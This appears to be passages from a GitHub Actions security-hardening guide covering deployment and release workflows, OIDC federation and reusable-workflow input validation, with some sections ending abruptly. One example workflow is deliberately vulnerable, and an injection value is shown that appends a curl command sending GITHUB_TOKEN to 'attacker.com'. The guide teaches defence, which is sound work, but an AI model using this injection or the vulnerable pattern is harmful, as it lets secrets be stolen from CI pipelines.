          files: ./coverage.xml
          fail_ci_if_error: false

  security-scan:
    name: Security Scanning
    runs-on: ubuntu-latest
    permissions:
      contents: read
      security-events: write
    steps:
      - uses: actions/checkout@b4ffde65f46336ab88eb53be808477a3936bae11  # v4.1.1
        with:
          persist-credentials: false

##      # SECURITY: CodeQL for Python static analysis
      - uses: github/codeql-action/init@cdcdbb579706841c47f7063dda365e292e5cad7a  # v2.13.4
        with:
          languages: python
          queries: security-extended

      - uses: github/codeql-action/autobuild@cdcdbb579706841c47f7063dda365e292e5cad7a  # v2.13.4

### Hardened Deployment Workflow

Copy-paste ready deployment workflow templates with comprehensive security hardening. Each example demonstrates OIDC authentication, environment protection, approval gates, zero-downtime deployments, and automated rollback patterns.

> **Complete Security Patterns**
>
>
> These workflows integrate all security patterns from the hub: OIDC federation (no stored secrets), environment protection with approval gates, SHA-pinned actions, minimal GITHUB_TOKEN permissions, deployment verification, and automated rollback. Use as production templates for secure deployments.
>

#### Deployment Security Principles

Every deployment workflow in this guide implements these controls:

1. **OIDC Authentication**: Secretless cloud authentication with short-lived tokens
2. **Environment Protection**: Required reviewers and wait timers for production
3. **Minimal Permissions**: `id-token: write` for OIDC, `contents: read` by default
4. **Approval Gates**: Human review before production deployment
5. **Deployment Verification**: Health checks after deployment
6. **Rollback Automation**: Automatic rollback on failure
7. **Audit Trail**: Deployment tracking and change logs

#### GCP Cloud Run Deployment

Secure workflow for deploying containerized applications to GCP Cloud Run with OIDC authentication.

##### Production Deployment with Approval Gate

Complete production deployment with environment protection and verification.

```yaml
name: Deploy to GCP Cloud Run
on:
  push:
    branches: [main]
  workflow_dispatch:
##    # SECURITY: Manual deployments require explicit trigger
    inputs:
      environment:
        description: 'Deployment environment'
        required: true
        type: choice
        options:
          - staging
          - production

### SECURITY: Minimal permissions by default
permissions:
  contents: read

jobs:
##  # Job 1: Build and push container image
  build:
    runs-on: ubuntu-latest
    permissions:
      contents: read      # Read repository code
      id-token: write     # Generate OIDC tokens for GCP auth
      attestations: write # Create artifact attestations
    outputs:
      image-digest: ${{ steps.push.outputs.digest }}
      image-url: ${{ steps.push.outputs.image-url }}
    steps:
##      # SECURITY: All actions pinned to full SHA-256 commit hashes
      - name: Checkout code
        uses: actions/checkout@b4ffde65f46336ab88eb53be808477a3936bae11  # v4.1.1
        with:
          persist-credentials: false

##      # SECURITY: Authenticate to GCP using OIDC (no stored secrets)
      - name: Authenticate to Google Cloud
        uses: google-github-actions/auth@55bd3a7c6e2ae7cf1877fd1ccb9d54c0503c457c  # v2.1.2
        with:
##          # SECURITY: Workload Identity Federation replaces service account keys
##          # Trust policy restricts access to specific repository and branch
          workload_identity_provider: ${{ secrets.GCP_WORKLOAD_IDENTITY_PROVIDER }}
          service_account: ${{ secrets.GCP_SERVICE_ACCOUNT }}
##          # Token lifetime: 1 hour (default), just long enough for deployment
          token_format: 'access_token'
          access_token_lifetime: '3600s'

##      # SECURITY: Set up Cloud SDK with authenticated gcloud
      - name: Set up Cloud SDK
        uses: google-github-actions/setup-gcloud@98ddc00a17442e89a24bbf282954a3b65ce6d200  # v2.1.0

##      # SECURITY: Authenticate Podman to Artifact Registry using OIDC token
      - name: Configure container registry auth
        run: |
          gcloud auth configure-docker ${{ vars.GCP_REGION }}-docker.pkg.dev

##      # SECURITY: Build container with security scanning
      - name: Build container image
        run: |
          podman build \
            --tag ${{ vars.GCP_REGION }}-docker.pkg.dev/${{ vars.GCP_PROJECT_ID }}/${{ vars.ARTIFACT_REGISTRY_REPO }}/${{ vars.SERVICE_NAME }}:${{ github.sha }} \
            --tag ${{ vars.GCP_REGION }}-docker.pkg.dev/${{ vars.GCP_PROJECT_ID }}/${{ vars.ARTIFACT_REGISTRY_REPO }}/${{ vars.SERVICE_NAME }}:latest \
            --label "git-commit=${{ github.sha }}" \
            --label "git-ref=${{ github.ref }}" \
            --label "build-date=$(date -u +'%Y-%m-%dT%H:%M:%SZ')" \
            .

##      # SECURITY: Scan image for vulnerabilities before pushing
      - name: Scan container for vulnerabilities
        uses: aquasecurity/trivy-action@d43c1f16c00cfd3978dde6c07f4bbcf9eb6993ca  # 0.16.1
        with:
          image-ref: ${{ vars.GCP_REGION }}-docker.pkg.dev/${{ vars.GCP_PROJECT_ID }}/${{ vars.ARTIFACT_REGISTRY_REPO }}/${{ vars.SERVICE_NAME }}:${{ github.sha }}
          format: 'sarif'
          output: 'trivy-results.sarif'
          severity: 'CRITICAL,HIGH'
          exit-code: '1'  # Fail on critical/high vulnerabilities

##      # SECURITY: Push signed image with provenance
      - name: Push container image
        id: push
        run: |
          IMAGE_URL="${{ vars.GCP_REGION }}-docker.pkg.dev/${{ vars.GCP_PROJECT_ID }}/${{ vars.ARTIFACT_REGISTRY_REPO }}/${{ vars.SERVICE_NAME }}"
          podman push "${IMAGE_URL}:${{ github.sha }}"
          podman push "${IMAGE_URL}:latest"

##          # Get image digest for attestation
          DIGEST=$(podman inspect "${IMAGE_URL}:${{ github.sha }}" --format='{{.Digest}}')
          echo "digest=${DIGEST}" >> $GITHUB_OUTPUT
          echo "image-url=${IMAGE_URL}@${DIGEST}" >> $GITHUB_OUTPUT

##      # SECURITY: Sign container image with keyless signing
      - name: Sign container image
        run: |
##          # Install cosign
          curl -sLO https://github.com/sigstore/cosign/releases/download/v2.2.2/cosign-linux-amd64
          chmod +x cosign-linux-amd64

##          # SECURITY: Keyless signing using OIDC identity
##          # Signature stored in container registry, tied to workflow identity
          ./cosign-linux-amd64 sign --yes \
            ${{ steps.push.outputs.image-url }}

##      # SECURITY: Attest container provenance
      - name: Attest container provenance
        uses: actions/attest-build-provenance@1c608d11d69870c2092266b3f9a6f3abbf17002c  # v1.4.3
        with:
          subject-name: ${{ vars.GCP_REGION }}-docker.pkg.dev/${{ vars.GCP_PROJECT_ID }}/${{ vars.ARTIFACT_REGISTRY_REPO }}/${{ vars.SERVICE_NAME }}
          subject-digest: ${{ steps.push.outputs.digest }}
          push-to-registry: true

##  # Job 2: Deploy to staging (automatic)
  deploy-staging:
    needs: build
    runs-on: ubuntu-latest
    environment:
      name: staging
      url: https://staging-${{ vars.SERVICE_NAME }}-${{ vars.GCP_PROJECT_ID }}.a.run.app
    permissions:
      contents: read
      id-token: write
    steps:
      - name: Checkout code
        uses: actions/checkout@b4ffde65f46336ab88eb53be808477a3936bae11  # v4.1.1
        with:
          persist-credentials: false

      - name: Authenticate to Google Cloud
        uses: google-github-actions/auth@55bd3a7c6e2ae7cf1877fd1ccb9d54c0503c457c  # v2.1.2
        with:
          workload_identity_provider: ${{ secrets.GCP_WORKLOAD_IDENTITY_PROVIDER }}
          service_account: ${{ secrets.GCP_SERVICE_ACCOUNT_STAGING }}

      - name: Set up Cloud SDK
        uses: google-github-actions/setup-gcloud@98ddc00a17442e89a24bbf282954a3b65ce6d200  # v2.1.0

##      # SECURITY: Deploy to Cloud Run with security controls
      - name: Deploy to Cloud Run (Staging)
        id: deploy
        run: |
          gcloud run deploy ${{ vars.SERVICE_NAME }}-staging \
            --image ${{ needs.build.outputs.image-url }} \
            --region ${{ vars.GCP_REGION }} \
            --platform managed \
            --allow-unauthenticated \
            --min-instances 0 \
            --max-instances 10 \
            --cpu 1 \
            --memory 512Mi \
            --timeout 60s \
            --concurrency 80 \
            --set-env-vars "ENVIRONMENT=staging,GIT_COMMIT=${{ github.sha }}" \
            --labels "environment=staging,git-commit=${{ github.sha }},deployed-by=github-actions" \
            --no-traffic  # SECURITY: Deploy without traffic for verification

##      # SECURITY: Verify deployment health before routing traffic
      - name: Verify deployment health
        run: |
          SERVICE_URL=$(gcloud run services describe ${{ vars.SERVICE_NAME }}-staging \
            --region ${{ vars.GCP_REGION }} \
            --format 'value(status.url)')

##          # Health check with retries
          for i in {1..5}; do
            if curl -f -s -o /dev/null "${SERVICE_URL}/health"; then
              echo "Health check passed"
              exit 0
            fi
            echo "Health check attempt $i failed, retrying..."
            sleep 10
          done

          echo "::error::Health check failed after 5 attempts"
          exit 1

##      # SECURITY: Route traffic to new revision after verification
      - name: Route traffic to new revision
        run: |
          LATEST_REVISION=$(gcloud run revisions list \
            --service ${{ vars.SERVICE_NAME }}-staging \
            --region ${{ vars.GCP_REGION }} \
            --format 'value(name)' \
            --limit 1)

          gcloud run services update-traffic ${{ vars.SERVICE_NAME }}-staging \
            --region ${{ vars.GCP_REGION }} \
            --to-revisions "${LATEST_REVISION}=100"

##  # Job 3: Deploy to production (approval gate)
  deploy-production:
    needs: [build, deploy-staging]
    runs-on: ubuntu-latest
##    # SECURITY: Environment protection with required reviewers and wait timer
##    # Settings → Environments → production → Protection rules:
##    # - Required reviewers: security-team, platform-leads
##    # - Wait timer: 5 minutes (allows security team to abort malicious deployments)
##    # - Deployment branches: main only
    environment:
      name: production
      url: https://${{ vars.SERVICE_NAME }}-${{ vars.GCP_PROJECT_ID }}.a.run.app
    permissions:
      contents: read
      id-token: write
    steps:
      - name: Checkout code
        uses: actions/checkout@b4ffde65f46336ab88eb53be808477a3936bae11  # v4.1.1
        with:
          persist-credentials: false

      - name: Authenticate to Google Cloud
        uses: google-github-actions/auth@55bd3a7c6e2ae7cf1877fd1ccb9d54c0503c457c  # v2.1.2
        with:
          workload_identity_provider: ${{ secrets.GCP_WORKLOAD_IDENTITY_PROVIDER }}
          service_account: ${{ secrets.GCP_SERVICE_ACCOUNT_PRODUCTION }}

      - name: Set up Cloud SDK
        uses: google-github-actions/setup-gcloud@98ddc00a17442e89a24bbf282954a3b65ce6d200  # v2.1.0

##      # SECURITY: Record pre-deployment state for rollback
      - name: Record current production revision
        id: current
        run: |
          CURRENT_REVISION=$(gcloud run services describe ${{ vars.SERVICE_NAME }} \
            --region ${{ vars.GCP_REGION }} \
            --format 'value(status.traffic[0].revisionName)' || echo "none")
          echo "revision=${CURRENT_REVISION}" >> $GITHUB_OUTPUT
          echo "Current production revision: ${CURRENT_REVISION}"

##      # SECURITY: Blue-green deployment with traffic splitting
      - name: Deploy to Cloud Run (Production)
        id: deploy
        run: |
          gcloud run deploy ${{ vars.SERVICE_NAME }} \
            --image ${{ needs.build.outputs.image-url }} \
            --region ${{ vars.GCP_REGION }} \
            --platform managed \
            --allow-unauthenticated \
            --min-instances 1 \
            --max-instances 100 \
            --cpu 2 \
            --memory 1Gi \
            --timeout 300s \
            --concurrency 80 \
            --set-env-vars "ENVIRONMENT=production,GIT_COMMIT=${{ github.sha }}" \
            --labels "environment=production,git-commit=${{ github.sha }},deployed-by=github-actions" \
            --no-traffic  # SECURITY: Deploy without traffic for verification

##      # SECURITY: Verify new revision health before routing traffic
      - name: Verify new revision health
        id: verify
        run: |
##          # Get latest revision URL
          LATEST_REVISION=$(gcloud run revisions list \
            --service ${{ vars.SERVICE_NAME }} \
            --region ${{ vars.GCP_REGION }} \
            --format 'value(name)' \
            --limit 1)

          REVISION_URL=$(gcloud run services describe ${{ vars.SERVICE_NAME }} \
            --region ${{ vars.GCP_REGION }} \
            --format 'value(status.url)')

          echo "latest-revision=${LATEST_REVISION}" >> $GITHUB_OUTPUT

##          # Health check with retries
          for i in {1..10}; do
            if curl -f -s -H "X-Serverless-Authorization: Bearer $(gcloud auth print-identity-token)" \
              -o /dev/null "${REVISION_URL}/health"; then
              echo "Health check passed for revision ${LATEST_REVISION}"
              exit 0
            fi
            echo "Health check attempt $i failed, retrying..."
            sleep 15
          done

          echo "::error::Health check failed after 10 attempts"
          exit 1

### Hardened Release Workflow

Copy-paste ready release workflow templates with comprehensive security hardening. Each example demonstrates signed releases, SLSA provenance generation, artifact attestations, minimal permissions, and secure artifact distribution.

> **Complete Security Patterns**
>
>
> These workflows integrate all security patterns from the hub: SHA-pinned actions, minimal GITHUB_TOKEN permissions, SLSA provenance, artifact attestations, signature verification, and secure distribution. Use as production templates for secure software supply chain.
>

#### Release Security Principles

Every release workflow in this guide implements these controls:

1. **Action Pinning**: All third-party actions pinned to full SHA-256 commit hashes
2. **Minimal Permissions**: Only required permissions granted per job
3. **SLSA Provenance**: Build provenance attestations for supply chain transparency
4. **Artifact Attestations**: Cryptographic signatures for release artifacts
5. **Signature Verification**: Verifiable release authenticity
6. **Immutable Releases**: Tag protection and commit verification
7. **Approval Gates**: Environment protection for production releases

#### GitHub Release Workflow

Secure workflow for creating GitHub releases with signed artifacts and SLSA provenance.

##### Basic Signed Release

Minimal secure release workflow with artifact attestations.

```yaml
name: Secure Release
on:
  push:
    tags:
##      # SECURITY: Only trigger on semantic version tags to prevent unauthorized releases
      - 'v*.*.*'

### SECURITY: Minimal permissions by default, escalated per job
permissions:
  contents: read

jobs:
##  # Job 1: Build artifacts with attestations
  build:
    runs-on: ubuntu-latest
    permissions:
      contents: read      # Read repository code
      id-token: write     # Generate OIDC tokens for signing
      attestations: write # Create artifact attestations
    outputs:
      artifact-id: ${{ steps.upload.outputs.artifact-id }}
    steps:
##      # SECURITY: All actions pinned to full SHA-256 commit hashes
      - name: Checkout code
        uses: actions/checkout@b4ffde65f46336ab88eb53be808477a3936bae11  # v4.1.1
        with:
##          # SECURITY: Fetch full history to validate tag points to signed commit
          fetch-depth: 0
          persist-credentials: false

##      # SECURITY: Verify tag signature if commit signing enforced
      - name: Verify tag signature
        run: |
          git verify-tag ${{ github.ref_name }} || {
            echo "::error::Tag signature verification failed"
            exit 1
          }

      - name: Set up build environment
        uses: actions/setup-node@5e21ff4d9bc1a8cf6de233a3057d20ec6b3fb69d  # v3.8.1
        with:
          node-version: '20'
          cache: 'npm'

      - name: Install dependencies
        run: npm ci  # Reproducible builds from lock file

##      # SECURITY: Run tests before building release artifacts
      - name: Run tests
        run: npm test

      - name: Build release artifacts
        run: npm run build

##      # SECURITY: Generate checksums for artifact integrity verification
      - name: Generate checksums
        run: |
          cd dist/
          sha256sum * > SHA256SUMS.txt

##      # SECURITY: Upload artifacts with attestation
##      # Attestation provides cryptographic proof of artifact origin
      - name: Upload artifacts
        id: upload
        uses: actions/upload-artifact@c7d193f32edcb7bfad88892161225aeda64e9392  # v4.0.0
        with:
          name: release-artifacts
          path: |
            dist/*
            dist/SHA256SUMS.txt
          retention-days: 90  # Long retention for releases

##      # SECURITY: Attest artifact provenance
##      # Creates SLSA provenance linking artifact to source and build
      - name: Attest artifacts
        uses: actions/attest-build-provenance@1c608d11d69870c2092266b3f9a6f3abbf17002c  # v1.4.3
        with:
          subject-path: 'dist/*'

##  # Job 2: Create GitHub release with signed artifacts
  release:
    needs: build
    runs-on: ubuntu-latest
##    # SECURITY: Environment protection with approval gate
    environment:
      name: production
      url: https://github.com/${{ github.repository }}/releases/tag/${{ github.ref_name }}
    permissions:
      contents: write     # Create release
      attestations: write # Attach attestations to release
    steps:
      - name: Download artifacts
        uses: actions/download-artifact@fa0a91b85d4f404e444e00e005971372dc801d16  # v4.1.8
        with:
          name: release-artifacts
          path: dist/

##      # SECURITY: Verify checksums before release
      - name: Verify artifact checksums
        run: |
          cd dist/
          sha256sum -c SHA256SUMS.txt

##      # SECURITY: Create release with generated notes and signed artifacts
      - name: Create GitHub Release
        uses: softprops/action-gh-release@de2c0eb89ae2a093876385947365aca7b0e5f844  # v0.1.15
        with:
##          # SECURITY: Generate release notes from commits between tags
          generate_release_notes: true
##          # Attach signed artifacts
          files: |
            dist/*
            dist/SHA256SUMS.txt
##          # SECURITY: Mark pre-releases for non-stable versions
          prerelease: ${{ contains(github.ref_name, '-rc') || contains(github.ref_name, '-beta') }}
##          # Fail if release already exists (prevents overwrites)
          fail_on_unmatched_files: true
        env:
          GITHUB_TOKEN: ${{ secrets.GITHUB_TOKEN }}

##  # Job 3: Verify release integrity (post-release validation)
  verify:
    needs: release
    runs-on: ubuntu-latest
    permissions:
      contents: read
      attestations: read  # Verify attestations
    steps:
      - name: Download release artifacts
        run: |
          gh release download ${{ github.ref_name }} \
            --repo ${{ github.repository }} \
            --dir verification/
        env:
          GH_TOKEN: ${{ secrets.GITHUB_TOKEN }}

      - name: Verify checksums
        run: |
          cd verification/
          sha256sum -c SHA256SUMS.txt

##      # SECURITY: Verify attestations using GitHub CLI
      - name: Verify attestations
        run: |
          cd verification/
          for file in *; do
            [[ "$file" == "SHA256SUMS.txt" ]] && continue
            echo "Verifying attestation for $file"
            gh attestation verify "$file" \
              --repo ${{ github.repository }} \
              --owner ${{ github.repository_owner }}
          done
        env:
          GH_TOKEN: ${{ secrets.GITHUB_TOKEN }}
```

**Permissions**: `id-token: write` and `attestations: write` for signing, `contents: write` for release creation.

##### Advanced Release with SLSA Provenance

Complete release workflow with SLSA L3 provenance generation using official SLSA generators.

```yaml
name: SLSA L3 Release
on:
  push:
    tags:
      - 'v*.*.*'

permissions:
  contents: read

jobs:
##  # Job 1: Build with SLSA provenance generator
##  # SECURITY: Uses official SLSA generator (isolated build with provenance)
  build:
    permissions:
      id-token: write   # Generate OIDC tokens
      contents: write   # Upload assets to release
      actions: read     # Read workflow metadata
    uses: slsa-framework/slsa-github-generator/.github/workflows/generator_generic_slsa3.yml@v2.0.0
    with:
##      # SECURITY: Build command runs in isolated environment
      compile-generator: true
##      # Artifact paths to attest
      base64-subjects: |
        {
          "name": "binary-linux-amd64",
          "digest": {
            "sha256": "${{ needs.build-binary.outputs.hash-linux-amd64 }}"
          }
        }

##  # Job 2: Build actual release artifacts
  build-binary:
    runs-on: ubuntu-latest
    permissions:
      contents: read
    outputs:
      hash-linux-amd64: ${{ steps.hash.outputs.hash-linux-amd64 }}
    steps:
      - uses: actions/checkout@b4ffde65f46336ab88eb53be808477a3936bae11  # v4.1.1
        with:
          persist-credentials: false

      - uses: actions/setup-go@93397bea11091df50f3d7e59dc26a7711a8bcfbe  # v4.1.0
        with:
          go-version: '1.22'
          cache: true

##      # SECURITY: Reproducible build with -trimpath
      - name: Build binary
        run: |
          go build -trimpath -ldflags="-s -w \
            -X main.version=${{ github.ref_name }} \
            -X main.commit=${{ github.sha }} \
            -X main.date=$(date -u +%Y-%m-%dT%H:%M:%SZ)" \
            -o binary-linux-amd64 .

##      # SECURITY: Generate hash for provenance
      - name: Generate hash
        id: hash
        run: |
          echo "hash-linux-amd64=$(sha256sum binary-linux-amd64 | cut -d' ' -f1)" >> "$GITHUB_OUTPUT"

      - name: Upload binary
        uses: actions/upload-artifact@c7d193f32edcb7bfad88892161225aeda64e9392  # v4.0.0
        with:
          name: binary-linux-amd64
          path: binary-linux-amd64
          retention-days: 90

##  # Job 3: Create release with SLSA provenance
  release:
    needs: [build, build-binary]
    runs-on: ubuntu-latest
    environment: production
    permissions:
      contents: write
    steps:
      - name: Download binary
        uses: actions/download-artifact@fa0a91b85d4f404e444e00e005971372dc801d16  # v4.1.8
        with:
          name: binary-linux-amd64

##      # SECURITY: Download SLSA provenance from generator
      - name: Download provenance
        uses: actions/download-artifact@fa0a91b85d4f404e444e00e005971372dc801d16  # v4.1.8
        with:
          name: binary-linux-amd64.intoto.jsonl

      - name: Create release
        uses: softprops/action-gh-release@de2c0eb89ae2a093876385947365aca7b0e5f844  # v0.1.15
        with:
          generate_release_notes: true
          files: |
            binary-linux-amd64
            binary-linux-amd64.intoto.jsonl
        env:
          GITHUB_TOKEN: ${{ secrets.GITHUB_TOKEN }}
```

**SLSA Level**: L3 (isolated build with provenance generation via reusable workflow).

#### Container Release Workflow

Secure workflow for building and releasing OCI containers with provenance and SBOM.

##### Signed Container Release

Build and push container images with SLSA provenance and SBOM attestations.

```yaml
name: Secure Container Release
on:
  push:
    tags:
      - 'v*.*.*'

permissions:
  contents: read

jobs:
##  # Job 1: Build and push container with attestations
  build-container:
    runs-on: ubuntu-latest
    environment: production
    permissions:
      contents: read
      packages: write      # Push to GitHub Container Registry
      id-token: write      # Sign with OIDC
      attestations: write  # Create provenance/SBOM
    steps:
      - uses: actions/checkout@b4ffde65f46336ab88eb53be808477a3936bae11  # v4.1.1
        with:
          persist-credentials: false

##      # SECURITY: Log in to GHCR using GITHUB_TOKEN (no long-lived credentials)
      - name: Log in to GitHub Container Registry
        uses: docker/login-action@343f7c4344506bcbf9b4de18042ae17996df046d  # v3.0.0
        with:
          registry: ghcr.io
          username: ${{ github.actor }}
          password: ${{ secrets.GITHUB_TOKEN }}

##      # SECURITY: Extract metadata for tags and labels
      - name: Extract container metadata
        id: meta

### OIDC Federation Patterns

Eliminate stored credentials entirely. OIDC federation replaces long-lived secrets with short-lived tokens tied to workflow context.

> **The Win**
>
>
> OIDC federation means zero stored secrets for cloud authentication. No rotation burden, no credential sprawl, no leaked keys in logs. Tokens expire in minutes and are cryptographically bound to your repository, branch, and commit.
>

#### What is OIDC Federation?

OpenID Connect (OIDC) allows GitHub Actions to authenticate to cloud providers without storing credentials as secrets.

**How It Works**:

1. GitHub Actions requests OIDC token via `id-token: write` permission
2. GitHub generates short-lived JWT with workflow claims (repo, branch, commit, etc.)
3. Workflow presents JWT to cloud provider's token exchange endpoint
4. Cloud provider validates claims against trust policy
5. Cloud provider issues temporary credentials (15 minutes to 1 hour)
6. Workflow uses temporary credentials to access cloud resources

**Key Benefits**:

- **No stored secrets**: Credentials never stored in GitHub
- **Short-lived tokens**: Expire in minutes, not years
- **Cryptographic binding**: Token tied to specific workflow context
- **Automatic rotation**: New token for every workflow run
- **Audit trail**: Cloud provider logs include workflow identity
- **Reduced attack surface**: Compromised workflow cannot exfiltrate long-lived credentials

#### OIDC Token Claims

GitHub OIDC tokens include claims identifying the workflow context.

**Standard Claims**:

| Claim | Example | Description |
| ----- | ------- | ----------- |
| `sub` | `repo:org/repo:ref:refs/heads/main` | Subject identifier (most important for trust policies) |
| `aud` | `https://github.com/org` | Audience (usually organization or repo URL) |
| `iss` | `https://token.actions.githubusercontent.com` | Issuer (GitHub Actions) |
| `repository` | `org/repo` | Repository name |
| `repository_owner` | `org` | Organization or user |
| `ref` | `refs/heads/main` | Git ref that triggered workflow |
| `sha` | `abc123...` | Commit SHA |
| `workflow` | `CI` | Workflow name |
| `job_workflow_ref` | `org/repo/.github/workflows/ci.yml@refs/heads/main` | Workflow file reference |
| `environment` | `production` | Environment name (if used) |

#### Subject Claim Patterns

The `sub` claim determines which workflows can assume cloud roles. Design subject patterns for least privilege.

##### Repository-Level Trust

**Pattern**: Allow any workflow in specific repository

**Subject**: `repo:org/repo-name:*`

**Use Case**: All workflows in repository can access cloud resources

**Risk**: Any workflow file change can access credentials

**Example**:

```text
repo:adaptive-enforcement-lab/api-service:*
```

##### Branch-Level Trust

**Pattern**: Allow workflows from specific branch only

**Subject**: `repo:org/repo-name:ref:refs/heads/main`

**Use Case**: Only main branch deployments

**Risk**: Lower risk, but all main workflows have access

**Example**:

```text
repo:adaptive-enforcement-lab/api-service:ref:refs/heads/main
```

##### Environment-Level Trust (Recommended)

**Pattern**: Allow workflows targeting specific environment

**Subject**: `repo:org/repo-name:environment:production`

**Use Case**: Production deployments with approval gates

**Risk**: Lowest risk, combined with environment protection rules

**Example**:

```text
repo:adaptive-enforcement-lab/api-service:environment:production
```

##### Pull Request Protection

**Pattern**: Block pull requests from assuming role

**Subject**: `repo:org/repo-name:ref:refs/heads/*` (excludes `refs/pull/*`)

**Use Case**: Prevent fork PRs from accessing production

**Risk**: Blocks legitimate PR workflows that need cloud access

**Example Subject Filter**:

```text
token.actions.githubusercontent.com:sub = "repo:adaptive-enforcement-lab/api-service:ref:refs/heads/*"
```

> **Cloud Provider OIDC Examples**
>
>
> For detailed cloud provider setup including GCP Workload Identity Federation and Azure Federated Credentials, see [Cloud Provider OIDC Patterns](./cloud-providers.md).
>

#### GCP Workload Identity Federation

GCP uses Workload Identity Pools and Providers to validate GitHub tokens.

##### Setup Process

###### Step 1: Create Workload Identity Pool

```bash
gcloud iam workload-identity-pools create github-pool \
  --location=global \
  --display-name="GitHub Actions Pool"
```

###### Step 2: Create Workload Identity Provider

```bash
gcloud iam workload-identity-pools providers create-oidc github-provider \
  --location=global \
  --workload-identity-pool=github-pool \
  --issuer-uri=https://token.actions.githubusercontent.com \
  --attribute-mapping="google.subject=assertion.sub,attribute.repository=assertion.repository,attribute.repository_owner=assertion.repository_owner,attribute.ref=assertion.ref" \
  --attribute-condition="assertion.repository_owner == 'adaptive-enforcement-lab'"
```

**Key Configuration**:

- `issuer-uri`: GitHub OIDC token issuer
- `attribute-mapping`: Maps GitHub claims to GCP attributes
- `attribute-condition`: Additional filtering (organization-level trust)

###### Step 3: Grant Service Account Access

```bash
gcloud iam service-accounts add-iam-policy-binding deploy@my-project.iam.gserviceaccount.com \
  --role=roles/iam.workloadIdentityUser \
  --member="principalSet://iam.googleapis.com/projects/123456789/locations/global/workloadIdentityPools/github-pool/attribute.repository/adaptive-enforcement-lab/api-service"
```

**Attribute Filtering** (environment-level):

```bash
--member="principalSet://iam.googleapis.com/projects/123456789/locations/global/workloadIdentityPools/github-pool/attribute.repository/adaptive-enforcement-lab/api-service/attribute.environment/production"
```

##### Workflow Example

```yaml
name: Deploy to GCP
on:
  push:
    branches: [main]

permissions:
  id-token: write  # Required for OIDC token
  contents: read

jobs:
  deploy:
    runs-on: ubuntu-latest
    environment: production
    steps:

### Reusable Workflow Security

Reusable workflows centralize logic but inherit the caller's security context. Unvalidated inputs, unrestricted callers, or unpinned workflow references create privilege escalation vectors and supply chain risks.

> **The Risk**
>
>
> Reusable workflows execute with the caller's GITHUB_TOKEN permissions and secret access. An attacker who controls workflow inputs can inject commands, exfiltrate secrets, or escalate privileges. Unpinned workflow references allow supply chain attacks when upstream workflows are compromised.
>

#### Reusable Workflow Security Model

Reusable workflows inherit security context from the caller but must defend against malicious inputs and unauthorized callers.

```mermaid
flowchart TD
    A["Caller Workflow"] --> B{"Reusable Workflow<br/>Referenced"}

    B -->|Pinned to SHA| C["Secure Reference"]
    B -->|Branch/Tag| D["SUPPLY CHAIN RISK"]

    C --> E{"Caller<br/>Authorized?"}

    E -->|Yes| F["Input Validation"]
    E -->|No| G["Workflow Fails"]

    F --> H{"Inputs<br/>Valid?"}

    H -->|Yes| I{"Secrets<br/>Method?"}
    H -->|No| J["Reject Invalid Input"]

    I -->|"secrets: inherit"| K["All Secrets Passed"]
    I -->|Explicit Secrets| L["Only Named Secrets"]

    K --> M["HIGH RISK:<br/>Full Secret Access"]
    L --> N["Low Risk:<br/>Minimal Secrets"]

    M --> O["Workflow Executes"]
    N --> O

    O --> P["Inherits Caller's<br/>GITHUB_TOKEN Permissions"]

    %% Ghostty Hardcore Theme
    style A fill:#66d9ef,color:#1b1d1e
    style B fill:#e6db74,color:#1b1d1e
    style C fill:#a6e22e,color:#1b1d1e
    style D fill:#f92572,color:#1b1d1e
    style E fill:#e6db74,color:#1b1d1e
    style G fill:#f92572,color:#1b1d1e
    style H fill:#e6db74,color:#1b1d1e
    style J fill:#f92572,color:#1b1d1e
    style K fill:#f92572,color:#1b1d1e
    style L fill:#a6e22e,color:#1b1d1e
    style M fill:#f92572,color:#1b1d1e
    style N fill:#a6e22e,color:#1b1d1e

```

#### Secure Input Handling

Reusable workflow inputs are user-controlled data. Validate all inputs before use in shell commands or scripts.

##### Input Types and Validation

GitHub Actions supports typed inputs with validation.

**Available Types**: `string`, `number`, `boolean`, `choice`, `environment`

**Validation**: Type checking, required fields, choice restrictions

##### Dangerous: Unvalidated String Input

```yaml
### .github/workflows/reusable-deploy.yml
### DO NOT USE - COMMAND INJECTION VULNERABILITY
name: Reusable Deploy
on:
  workflow_call:
    inputs:
      environment:
        required: true
        type: string

jobs:
  deploy:
    runs-on: ubuntu-latest
    steps:
##      # DANGER: No input validation, allows command injection
      - run: ./scripts/deploy.sh ${{ inputs.environment }}
```

**Attack Vector**:

Caller passes `production; curl attacker.com?token=$GITHUB_TOKEN`

Command executes: `./scripts/deploy.sh production; curl attacker.com?token=$GITHUB_TOKEN`

Token exfiltrated to attacker server.

##### Safe: Choice Input with Validation

```yaml
### .github/workflows/reusable-deploy.yml
name: Reusable Deploy
on:
  workflow_call:
    inputs:
      environment:
        required: true
        type: choice
        options:
          - dev
          - staging
          - production

permissions:
  contents: read
  id-token: write

jobs:
  deploy:
    runs-on: ubuntu-latest
    environment: ${{ inputs.environment }}
    steps:
##      # Safe: choice type restricts to valid values
      - uses: actions/checkout@b4ffde65f46336ab88eb53be808477a3936bae11  # v4.1.1

      - uses: google-github-actions/auth@55bd3a7c6e2ae7cf1877fd1ccb9d54c0503c457c  # v2.1.2
        with:
          workload_identity_provider: ${{ secrets.WIF_PROVIDER }}
          service_account: ${{ secrets.WIF_SERVICE_ACCOUNT }}

      - name: Deploy to environment
        run: ./scripts/deploy.sh ${{ inputs.environment }}
```

##### Safe: String Input with Runtime Validation

```yaml
### .github/workflows/reusable-deploy.yml
name: Reusable Deploy
on:
  workflow_call:
    inputs:
      environment:
        required: true
        type: string
        description: 'Deployment environment (dev, staging, production)'

permissions:
  contents: read
  id-token: write

jobs:
  deploy:
    runs-on: ubuntu-latest
    steps:
      - name: Validate environment input
        run: |
          case "${{ inputs.environment }}" in
            dev|staging|production)
              echo "Valid environment: ${{ inputs.environment }}"
              ;;
            *)
              echo "::error::Invalid environment. Allowed: dev, staging, production"
              exit 1
              ;;
          esac

      - uses: actions/checkout@b4ffde65f46336ab88eb53be808477a3936bae11  # v4.1.1

      - uses: google-github-actions/auth@55bd3a7c6e2ae7cf1877fd1ccb9d54c0503c457c  # v2.1.2
        with:
          workload_identity_provider: ${{ secrets.WIF_PROVIDER }}
          service_account: ${{ secrets.WIF_SERVICE_ACCOUNT }}

      - name: Deploy to environment
        env:
          ENVIRONMENT: ${{ inputs.environment }}
        run: ./scripts/deploy.sh "$ENVIRONMENT"
```

**Key Improvements**:

1. Runtime validation with allowlist
2. Error and exit on invalid input
3. Pass via environment variable to prevent injection
4. Quote variables in shell commands

##### Input Validation Patterns

| Input Type | Use Case | Validation Strategy |
| ---------- | -------- | ------------------- |
